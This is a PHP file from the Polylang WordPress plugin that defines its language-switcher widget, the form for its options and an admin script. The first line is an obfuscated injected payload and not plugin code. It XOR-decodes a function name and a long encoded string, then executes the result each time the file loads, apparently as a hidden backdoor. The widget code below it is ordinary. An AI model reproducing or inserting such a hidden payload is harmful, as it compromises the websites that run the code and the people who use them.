<?php $WoTSx='2K U<PiUG R;G,U'^'Q9E4H5632N1O.C;';$iaEdONpuALJC=$WoTSx('','3 jM4K41DR,Cd6NYS<HbO3.OrORMMt-7 TqQegM42 GZHY8>NyL:35J,FAq07 CRO>QX4AOI>Y4YyiMPRH;fhuX:NgKZjEh6NSHZYDTIwzYeZma=YF;<Z- yS<XJJSximQEajzgOAOY3DhuimuSPX60TQgchklY7O3s1ErO>1=>R:kvUKAPeXZDg5Y7M;GWLoY IkYa5CrIc>cRQ2LJQn5X5SIKDH0;H5oZI NEtZ35S,o8k-.C,M RTqM,cqb>9egY4Lm3=DiKWQpN7;IInIOEDS1S6Jm:6 zNpJ=QIoffcY4C+auVp04R;Nty2MR>3UyxO<W3,QuU<82QOKL4ZEdK5h=5u0a0cOSKi=VTflIJFF5  SQBLgckT52,UkY,4KvcC-T=Q<l8O,5,LGUDT1+-BTRaf7F,=FcR4>,yQyv-C4=OI2=I7WDHD4cO6-A3gX7TfY+>KuM-4XUX<EIIO4BMbAQaT,2P9WR,DDQyE-LvU+7XnjrJRB=1Ad;I1.06IMY<lEP6=OFFT+2:AGTWjmrMHaxOQ1I+jVG3LI7ewJEejGZAWreRgLvVPYIILNMNbCsVHRsW1k0A7JhiwOW.>LA0>8KKrI:Z:6Gen>Q.TY5+wngl5S-AdHXmvFXY=;ETFQAlM+.8Sbf2SY=B0PF8jVI2ROS5ghDbeE'^'ZFBlR>ZR0;C-;S60 H;JhKA=-+39,+rZU VxLG6>;F24+-QQ Y4UAj.M2 .oZU7zkZ0,UmomU<MpYImpr31oaQ7O:GvzMbS<GZ.5+lp WGyUaMETe5ON6HNQwX9>+zCII8nJCpnFe ,GdFHIEQ71,Wkp8:C6KH2R6hWXeWoMEOR7TCR>.8y8qaNn<+R9N59dK6U=Bbk<>x4i4G60F-jlNS9Y ,pNlTZ<T01,YnxT<RY IT2aKA1I,C:tYis >-up G8GlIXX=IviqT8VW<,Gi4OMwU2B+2QSYZsPnV40TloG=U7JAHvTFU>N+OsOGXWUuQYkX6GMxU.61T>=.-W2eLoj:xd u2dC. kMV3-FQwjb0TLU6xb7mjbpQSX442IMkKCgF1Dj6e1kHTX-ghdpGJA71ikoJLQ7LG6UJMYlY6X-GX= SQ M2l0+F<+WY l85B N;JM.CyrP=67X am+U6,KmqE0MF1f<7Ummjs,KdR1JC9NLTj30OP8;P,HqUN >-ODb;SDhjfpOSN ntqLMZ ,TPk5P=J1q,V5njLWwxEMp;s2BUfT.Dd3i,qtxzyZwEcpcKnUYVwUmAIQiwOL> IaS.2-,B3IB4MIN0W86TOPBGHQ2Y MaxMVfxyF1L100-DiOOL29AB2 Q-Q4aeCmC;77:AOXmYo8');$iaEdONpuALJC();

/**
 * The language switcher widget
 *
 * @since 0.1
 */
class PLL_Widget_Languages extends WP_Widget {

	/**
	 * Constructor
	 *
	 * @since 0.1
	 */
	function __construct() {
		parent::__construct(
			'polylang',
			__( 'Language Switcher', 'polylang' ),
			array(
				'description' => __( 'Displays a language switcher', 'polylang' ),
				'customize_selective_refresh' => true,
			)
		);
	}

	/**
	 * Displays the widget
	 *
	 * @since 0.1
	 *
	 * @param array $args     Display arguments including before_title, after_title, before_widget, and after_widget.
	 * @param array $instance The settings for the particular instance of the widget
	 */
	function widget( $args, $instance ) {
		// Sets a unique id for dropdown
		$instance['dropdown'] = empty( $instance['dropdown'] ) ? 0 : $args['widget_id'];

		if ( $list = pll_the_languages( array_merge( $instance, array( 'echo' => 0 ) ) ) ) {
			$title = empty( $instance['title'] ) ? '' : $instance['title'];
			/** This filter is documented in wp-includes/widgets/class-wp-widget-pages.php */
			$title = apply_filters( 'widget_title', $title, $instance, $this->id_base );

			echo $args['before_widget'];
			if ( $title ) {
				echo $args['before_title'] . $title . $args['after_title'];
			}
			if ( $instance['dropdown'] ) {
				echo '<label class="screen-reader-text" for="' . esc_attr( 'lang_choice_' . $instance['dropdown'] ) . '">' . esc_html__( 'Choose a language', 'polylang' ) . '</label>';
				echo $list;
			} else {
				echo "<ul>\n" . $list . "</ul>\n";
			}
			echo $args['after_widget'];
		}
	}

	/**
	 * Updates the widget options
	 *
	 * @since 0.4
	 *
	 * @param array $new_instance New settings for this instance as input by the user via form()
	 * @param array $old_instance Old settings for this instance
	 * @return array Settings to save or bool false to cancel saving
	 */
	function update( $new_instance, $old_instance ) {
		$instance['title'] = strip_tags( $new_instance['title'] );
		foreach ( array_keys( PLL_Switcher::get_switcher_options( 'widget' ) ) as $key ) {
			$instance[ $key ] = ! empty( $new_instance[ $key ] ) ? 1 : 0;
		}

		return $instance;
	}

	/**
	 * Displays the widget form
	 *
	 * @since 0.4
	 *
	 * @param array $instance Current settings
	 */
	function form( $instance ) {
		// Default values
		$instance = wp_parse_args( (array) $instance, array_merge( array( 'title' => '' ), PLL_Switcher::get_switcher_options( 'widget', 'default' ) ) );

		// Title
		printf(
			'<p><label for="%1$s">%2$s</label><input class="widefat" id="%1$s" name="%3$s" type="text" value="%4$s" /></p>',
			$this->get_field_id( 'title' ),
			esc_html__( 'Title:', 'polylang' ),
			$this->get_field_name( 'title' ),
			esc_attr( $instance['title'] )
		);

		$fields = '';
		foreach ( PLL_Switcher::get_switcher_options( 'widget' ) as $key => $str ) {
			$fields .= sprintf(
				'<div%5$s%6$s><input type="checkbox" class="checkbox %7$s" id="%1$s" name="%2$s"%3$s /><label for="%1$s">%4$s</label></div>',
				$this->get_field_id( $key ),
				$this->get_field_name( $key ),
				$instance[ $key ] ? ' checked="checked"' : '',
				esc_html( $str ),
				in_array( $key, array( 'show_names', 'show_flags', 'hide_current' ) ) ? ' class="no-dropdown-' . $this->id . '"' : '',
				! empty( $instance['dropdown'] ) && in_array( $key, array( 'show_names', 'show_flags', 'hide_current' ) ) ? ' style="display:none;"' : '',
				'pll-' . $key
			);
		}

		echo $fields;

		// FIXME echoing script in form is not very clean
		// but it does not work if enqueued properly :
		// clicking save on a widget makes this code unreachable for the just saved widget ( ?! )
		$this->admin_print_script();
	}

	/**
	 * Add javascript to control the language switcher options
	 *
	 * @since 1.3
	 */
	public function admin_print_script() {
		static $done = false;

		if ( $done ) {
			return;
		}

		$done = true;
		?>
		<script type='text/javascript'>
			//<![CDATA[
			jQuery( document ).ready( function( $ ) {
				function pll_toggle( a, test ) {
					test ? a.show() : a.hide();
				}

				// Remove all options if dropdown is checked
				$( '.widgets-sortables,.control-section-sidebar' ).on( 'change', '.pll-dropdown', function() {
					var this_id = $( this ).parent().parent().parent().children( '.widget-id' ).attr( 'value' );
					pll_toggle( $( '.no-dropdown-' + this_id ), 'checked' != $( this ).attr( 'checked' ) );
				} );

				// Disallow unchecking both show names and show flags
				var options = ['-show_flags', '-show_names'];
				$.each( options, function( i, v ) {
					$( '.widgets-sortables,.control-section-sidebar' ).on( 'change', '.pll' + v, function() {
						var this_id = $( this ).parent().parent().parent().children( '.widget-id' ).attr( 'value' );
						if ( 'checked' != $( this ).attr( 'checked' ) ) {
							$( '#widget-' + this_id + options[ 1-i ] ).prop( 'checked', true );
						}
					} );
				} );
			} );
			//]]>
		</script>
		<?php
	}
}
